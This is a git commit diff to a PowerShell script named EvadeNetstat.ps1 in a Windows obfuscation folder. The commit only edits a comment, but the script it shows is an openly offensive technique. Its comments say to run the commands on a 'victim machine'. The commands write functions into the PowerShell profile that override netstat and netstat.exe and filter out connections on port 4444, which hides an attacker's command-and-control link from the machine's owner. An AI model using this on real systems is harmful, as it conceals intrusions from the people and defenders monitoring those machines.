f01168df337b8fcf6fbf23b67f96bbfaf76fb085
megatop1 <43348736+megatop1@users.noreply.github.com>
2022-01-15 22:27:42 -0500

    Update EvadeNetstat.ps1

--- Windows/Obfuscation/EvadeNetstat.ps1
+++ Windows/Obfuscation/EvadeNetstat.ps1
@@ -11,7 +11,6 @@ function netstat { netstat.exe $args }
 # RUN THE BELOW on the VICTIM MACHINE's PowerShell
 echo 'function netstat { netstat.exe $args | Select-String -notmatch "4444" }' > $PROFILE
 
-# -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # When using "netstat," the function will operate as expected.
 # However, PowerShell will ignore it entirely if called with "netstat.exe."
 # A simple solution to this is to create two functions, one called "netstat" and the other "netstat.exe." 
@@ -20,7 +19,7 @@ echo 'function netstat { netstat.exe $args | Select-String -notmatch "4444" }' >
 echo 'function netstat { powershell.exe -NoProfile -Command "netstat.exe $args" | Select-String -notmatch "4444" }' > $PROFILE
 
 # Next, perform the command again, but name the function "netstat.exe" and use double arrows (>>) to append it to the profile.
-# RUN THE BELOW IN THE C2
+# RUN THE BELOW IN THE VICTIM MACHINE
 echo 'function netstat.exe { powershell.exe -NoProfile -Command "netstat.exe $args" | Select-String -notmatch "4444" }' >> $PROFILE
 
 #Close the powershell session on the target box and open a new one to take effect. 
